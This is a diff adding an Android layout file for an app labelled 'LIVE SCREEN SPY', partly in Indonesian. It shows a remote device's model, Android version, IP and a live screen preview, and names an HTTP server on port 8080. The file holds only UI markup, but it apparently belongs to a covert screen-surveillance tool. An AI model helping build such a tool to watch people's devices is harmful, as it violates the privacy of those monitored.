@@ -1,0 +1,108 @@
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#0a0a0a">
+    
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        android:padding="16dp">
+        
+        <!-- Header -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="🔴 LIVE SCREEN SPY"
+            android:textSize="24sp"
+            android:textColor="#ff4444"
+            android:textStyle="bold"
+            android:gravity="center"
+            android:padding="10dp"/>
+        
+        <!-- Status -->
+        <TextView
+            android:id="@+id/statusText"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="🟡 Menunggu koneksi..."
+            android:textColor="#ffff00"
+            android:textSize="14sp"
+            android:gravity="center"
+            android:padding="10dp"
+            android:background="#1a1a1a"
+            android:layout_marginBottom="20dp"/>
+        
+        <!-- Device Info -->
+        <TextView
+            android:id="@+id/deviceInfoText"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="📱 Device: Unknown\n⚙️ Android: Unknown\n🌐 IP: Unknown"
+            android:textColor="#00ff00"
+            android:textSize="12sp"
+            android:padding="15dp"
+            android:background="#1a1a1a"
+            android:layout_marginBottom="10dp"/>
+        
+        <!-- Timestamp -->
+        <TextView
+            android:id="@+id/timestampText"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="🕒 --:--:--"
+            android:textColor="#00aaff"
+            android:textSize="12sp"
+            android:gravity="center"
+            android:padding="5dp"/>
+        
+        <!-- Screen Preview -->
+        <ImageView
+            android:id="@+id/screenView"
+            android:layout_width="match_parent"
+            android:layout_height="400dp"
+            android:scaleType="fitCenter"
+            android:background="#000000"
+            android:layout_marginTop="10dp"
+            android:layout_marginBottom="20dp"/>
+        
+        <!-- Controls -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal">
+            
+            <Button
+                android:layout_width="0dp"
+                android:layout_height="50dp"
+                android:layout_weight="1"
+                android:text="🔄 Refresh"
+                android:textColor="#ffffff"
+                android:background="#ff4444"
+                android:layout_marginEnd="5dp"
+                android:onClick="onRefreshClick"/>
+                
+            <Button
+                android:layout_width="0dp"
+                android:layout_height="50dp"
+                android:layout_weight="1"
+                android:text="💾 Save"
+                android:textColor="#ffffff"
+                android:background="#0088cc"
+                android:layout_marginStart="5dp"
+                android:onClick="onSaveClick"/>
+        </LinearLayout>
+        
+        <!-- Server Info -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="🌐 Server: 8080\n📡 Protocol: HTTP\n🔥 CYBER indonet v1.0"
+            android:textSize="10sp"
+            android:textColor="#666666"
+            android:gravity="center"
+            android:layout_marginTop="20dp"/>
+            
+    </LinearLayout>
+</ScrollView>
